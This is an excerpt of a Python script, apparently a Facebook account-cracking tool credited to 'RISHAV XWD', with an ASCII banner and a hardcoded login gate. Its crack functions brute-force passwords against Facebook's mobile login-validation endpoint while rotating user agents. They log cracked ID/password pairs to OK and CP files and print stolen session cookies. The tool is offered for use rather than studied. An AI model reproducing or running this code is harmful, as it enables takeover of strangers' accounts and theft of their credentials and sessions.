...
while attemps < 12345677901:
    ...
    if username == 'RISHAV' and password == 'XWD':
...
▣▞▚▞▚▞▚▞▚▞▚
   ...
   ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
   \033[1;97m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
   ║    Author                   • \33[1;38mRISHAV XWD ]\33[1;38m    ║\033[1;31m 
   ║    Facebook                 • RISHAV XWD]  ║  \033[1;97m  
   ║    Github                   • \33[1;38mgithub.Rishav.Exeyyy]  ║\33[1;34m   
...
def setting():
    ...
    #os.system("xdg-open https://www.facebook.com/rishav.Exeyy")
    if hc in ['1','01']:
...
def passwrd():
    ...
    print(f'\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mJUST USE YOUR FLIGHT MODE FOR SPEED!')
    print('\033[0;97m===============================================')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}•[RISHAV THE GOATM1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[RISHAV THE GOAT-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[RISHAV THE GOAT-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " RISHAV THE GOAT,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[RISHAV THE GOAT-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•RISHAV THE GOAT-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•RISHAV THE GOAT-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  RISHAV THE GOAT,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
